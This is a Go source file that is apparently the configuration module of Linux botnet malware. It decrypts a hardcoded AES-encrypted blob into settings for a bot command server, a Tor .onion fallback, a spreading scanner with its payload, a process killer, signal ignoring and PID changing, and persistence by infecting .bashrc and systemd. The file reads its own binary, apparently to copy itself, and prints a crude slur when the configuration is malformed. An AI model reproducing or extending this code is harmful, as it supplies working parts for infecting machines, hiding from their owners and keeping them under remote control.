package config

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
)

// CONFIG

/*


1 - server ip   :: string
2 - server port :: string
3 - ignore signals      :: bool
4 - scanner     :: bool
5 - num cpu (scanner) :: string
6 - max cpu load      :: string
7 - pid changer       :: bool
8 - debug            :: bool
9 - killer min|max pid (if max=-1 no limit) :: string
10 - killer enabled :: bool
11 - bashrc infecttion ::  bool
12 - systemd infection :: bool
13 - payload       :: string

14 - tor server url (.onion) :: string
15 - tor server port :: string
16 - tor enabled :: bool


\\ - separator
*/

var (
	CONFIG = "7685a6444793354346e355477694c55715161336e68696c7a4e72654c306a584f4466314a774b644658715854766a703835724b437273496c6970724d787679313945595a76617685a6444793354346e355477694c55715161336e68696c7a4e72654c306a584f4466314a774b644658715854766a703835724b437273496c6970724d787679313945595a7661"
)

// DO NOT CHANGE
var (
	TOR_SERVER string
	TOR_PORT   string

	TOR_ENABLED bool

	BOT_SERVER string
	BOT_PORT   string

	SCANNER_ENABLED     bool
	SCANNER_PAYLOAD     string
	SCANNER_MIN_NUM_CPU int

	MAX_CPU_VALUE int

	IGNORE_SIGNALS bool
	PID_CHANGER    bool

	DEBUG bool

	BINARY_FILE []byte

	KILLER_ENABLED            bool
	BASHRC_INFECTION_ENABLED  bool
	SYSTEMD_INFECTION_ENABLED bool

	MIN_KILLER_PID int
	MAX_KILLER_PID int

	DISABLE_REAL_BOT_SERVER bool
)

func Config() {

	key := []byte{120, 70, 64, 48, 52, 101, 80, 55, 65, 78, 33, 66, 103, 76, 101, 117, 53, 53, 69, 73, 35, 75, 76, 74, 83, 86, 97, 33, 81, 118, 56, 80}

	dec, err := hex.DecodeString(CONFIG)
	if err != nil {
		os.Exit(0)
	}

	decrypted := Decrypt(key, string(dec))
	if decrypted == "" {
		os.Exit(0)
	}

	res := strings.Split(decrypted, "\\\\")

	if len(res) < 8 {
		println("fuck u stupid gay")
		os.Exit(0)
	}

	BOT_SERVER = res[0]
	BOT_PORT = res[1]

	if BOT_SERVER == "disable" && BOT_PORT == "disable" {
		DISABLE_REAL_BOT_SERVER = true
	}

	IGNORE_SIGNALS, _ = strconv.ParseBool(res[2])

	SCANNER_ENABLED, _ = strconv.ParseBool(res[3])

	SCANNER_MIN_NUM_CPU, _ = strconv.Atoi(res[4])

	MAX_CPU_VALUE, _ = strconv.Atoi(res[5])

	PID_CHANGER, _ = strconv.ParseBool(res[6])

	DEBUG, _ = strconv.ParseBool(res[7])

	MIN_KILLER_PID, _ = strconv.Atoi(strings.Split(res[8], "|")[0])

	maxkiller, _ := strconv.Atoi(strings.Split(res[8], "|")[1])

	if maxkiller == -1 {
		MAX_KILLER_PID = 1 << 30
	}

	KILLER_ENABLED, _ = strconv.ParseBool(res[9])
	BASHRC_INFECTION_ENABLED, _ = strconv.ParseBool(res[10])
	SYSTEMD_INFECTION_ENABLED, _ = strconv.ParseBool(res[11])

	SCANNER_PAYLOAD = res[12]
	TOR_SERVER = res[13]
	TOR_PORT = res[14]

	TOR_ENABLED, _ = strconv.ParseBool(res[15])

	BINARY_FILE, _ = os.ReadFile(os.Args[0])

	if DEBUG {
		fmt.Printf("CONFIG:\nTor Enabled: %t\nTor Server: %s\nTor Port: %s\nBot server: %s\nBot port: %s\nScanner enabled: %t\nScanner payload: %s\nScanner min num cpu: %d\nMax cpu value: %d\nIgnore signals: %t\nPid changer: %t\nKiller enabled: %t\nBashrc inf. enabled: %t\nSystemd inf. enabled: %t\nMin-Max killer pid: %d-%d\n------------------------\n", TOR_ENABLED, TOR_SERVER, TOR_PORT, BOT_SERVER, BOT_PORT, SCANNER_ENABLED, SCANNER_PAYLOAD, SCANNER_MIN_NUM_CPU, MAX_CPU_VALUE, IGNORE_SIGNALS, PID_CHANGER, KILLER_ENABLED, BASHRC_INFECTION_ENABLED, SYSTEMD_INFECTION_ENABLED, MIN_KILLER_PID, MAX_KILLER_PID)
	}
}

func Encrypt(key []byte, plain string) string {
	byteMsg := []byte(plain)
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	cipherText := make([]byte, aes.BlockSize+len(byteMsg))
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println(err)
		return ""
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], byteMsg)

	return base64.StdEncoding.EncodeToString(cipherText)
}

func Decrypt(key []byte, plain string) string {
	cipherText, err := base64.StdEncoding.DecodeString(plain)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	if len(cipherText) < aes.BlockSize {
		fmt.Println(err)
		return ""
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)

	return string(cipherText)
}
